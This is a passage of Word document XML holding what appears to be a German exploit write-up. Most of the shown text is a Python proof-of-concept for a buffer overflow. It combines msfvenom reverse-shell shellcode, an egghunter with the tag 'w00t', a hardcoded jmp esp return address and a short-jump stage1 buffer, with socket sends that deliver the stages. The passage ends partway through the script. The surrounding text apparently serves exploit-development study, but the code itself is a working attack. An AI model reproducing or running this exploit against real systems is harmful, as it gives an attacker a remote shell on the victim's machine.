        <w:t xml:space="preserve"> des Egghunters </w:t>
      </w:r>
      <w:r w:rsidR="00455BBA" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>vollzogen, da der Egghunter das Egg sonst natürlich nicht finden kann.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06393A4D" w14:textId="5C7E5777" w:rsidR="0034364F" w:rsidRPr="00B47CB9" w:rsidRDefault="0034364F" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tabellenraster"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9060"/>
      </w:tblGrid>
      <w:tr w:rsidR="0034364F" w:rsidRPr="00B47CB9" w14:paraId="6752D01D" w14:textId="77777777" w:rsidTr="0034364F">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9060" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1E2BCB3F" w14:textId="77777777" w:rsidR="0034364F" w:rsidRPr="000700A3" w:rsidRDefault="0034364F" w:rsidP="0034364F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>s.send(bytes('A \r\n', 'utf-8')) # Adding new message</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1120E131" w14:textId="77777777" w:rsidR="0034364F" w:rsidRPr="000700A3" w:rsidRDefault="0034364F" w:rsidP="0034364F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>s.recv(1024)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="356BDC35" w14:textId="77777777" w:rsidR="0034364F" w:rsidRPr="000700A3" w:rsidRDefault="0034364F" w:rsidP="0034364F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>s.send(stage2 + bytes('\r\n', 'utf-8')) # Message Name</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="05EBBB11" w14:textId="77777777" w:rsidR="0034364F" w:rsidRPr="000700A3" w:rsidRDefault="0034364F" w:rsidP="0034364F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>s.recv(1024)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3F743E89" w14:textId="77777777" w:rsidR="0034364F" w:rsidRPr="000700A3" w:rsidRDefault="0034364F" w:rsidP="0034364F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>s.send(stage2 + bytes('\r\n', 'utf-8')) # Message Body</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6EDE759C" w14:textId="698FF2EC" w:rsidR="0034364F" w:rsidRPr="00B47CB9" w:rsidRDefault="0034364F" w:rsidP="0034364F">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>s.recv(1024)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="75EE529C" w14:textId="6BAAAAB2" w:rsidR="0034364F" w:rsidRPr="00B47CB9" w:rsidRDefault="0034364F" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D6365BB" w14:textId="00E84C71" w:rsidR="006D58DE" w:rsidRPr="00B47CB9" w:rsidRDefault="00455BBA" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r w:rsidR="00606B6C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>er komplette POC wurde hier nochmal</w:t>
      </w:r>
      <w:r w:rsidR="002A6A44" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00606B6C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="002A6A44" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">zum Zwecke der Lesbarkeit, </w:t>
      </w:r>
      <w:r w:rsidR="00606B6C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">als </w:t>
      </w:r>
      <w:r w:rsidR="002A6A44" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Ganzes</w:t>
      </w:r>
      <w:r w:rsidR="00606B6C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> eingefügt</w:t>
      </w:r>
      <w:r w:rsidR="002A6A44" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37E75B91" w14:textId="41B0949B" w:rsidR="00606B6C" w:rsidRPr="00B47CB9" w:rsidRDefault="00606B6C" w:rsidP="004D017F">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Tabellenraster"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9060"/>
      </w:tblGrid>
      <w:tr w:rsidR="00606B6C" w:rsidRPr="00B47CB9" w14:paraId="2CC658AC" w14:textId="77777777" w:rsidTr="00606B6C">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9060" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="734C34CF" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="000700A3" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>#!/usr/bin/python</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4D92E727" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="000700A3" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>import socket</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="17BAAA0C" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="000700A3" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F1A50E5" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="000700A3" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="5F9E466B" w14:textId="5F33031F" w:rsidR="00606B6C" w:rsidRPr="000700A3" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t># reverse shell erstellt mit msfvenom</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="56005FFF" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="000700A3" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell =  b""</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="676F8D68" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="000700A3" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D90AB78" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="000700A3" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="720EE884" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="000700A3" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="40FB0C8F" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="000700A3" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A1DA67C" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="000700A3" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5E88C966" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="000700A3" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="40A32CB0" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="000700A3" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4EF64596" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="000700A3" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="58D869AD" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="000700A3" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="015AF80E" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="000700A3" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="19EADB46" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="000700A3" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="61EACA05" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="000700A3" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="07551300" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="000700A3" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="65C69574" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="000700A3" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E6074A9" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="000700A3" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x00\x02\x0b\x68"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="256831FE" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="000700A3" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\x02\x00\x15\xb3\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="29529266" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="000700A3" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5FC72493" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="000700A3" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="000700A3">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="75D30D37" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="004D58C1" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3CAEF3D0" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="004D58C1" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1ECC3DB8" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="00B47CB9" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>shell += b"\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1C687671" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="00B47CB9" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>shell += b"\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E94822C" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="00B47CB9" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00B47CB9">
              <w:rPr>
                <w:lang w:val="de-AT"/>
              </w:rPr>
              <w:t>shell += b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5252C9DE" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="004D58C1" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4D173B77" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="004D58C1" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>shell += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F511AB3" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="004D58C1" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t># egg which should be found by egghunter</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="357A1008" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="004D58C1" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>egg = b'w00tw00t'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="26C5D5EE" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="004D58C1" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>stage2 = egg + shell</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0EACC8D5" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="004D58C1" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="15A13DCB" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="004D58C1" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="65CC40E0" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="004D58C1" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t># egghunter with tag w00t 32 byte</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="67E1D10D" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="004D58C1" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>egghunter = b'\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5D1DCD57" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="004D58C1" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>#jmp esp 77F1E684</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5B5B78D7" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="004D58C1" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>eip = b'\x84\xE6\xF1\x77'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5F37C212" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="004D58C1" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>#short jump -44 byte</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="791D10F1" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="004D58C1" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>jmpBack = b'\xEB\xD4'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6B1FD6AC" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="004D58C1" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="004D58C1">
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
              <w:t>stage1 = b'\x90'*4 + egghunter + b'\x90'*4 + eip + jmpBack</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3F7B7EB1" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="004D58C1" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
                <w:lang w:val="en-NZ"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="7FB83007" w14:textId="77777777" w:rsidR="00606B6C" w:rsidRPr="004D58C1" w:rsidRDefault="00606B6C" w:rsidP="00606B6C">
            <w:pPr>
              <w:rPr>
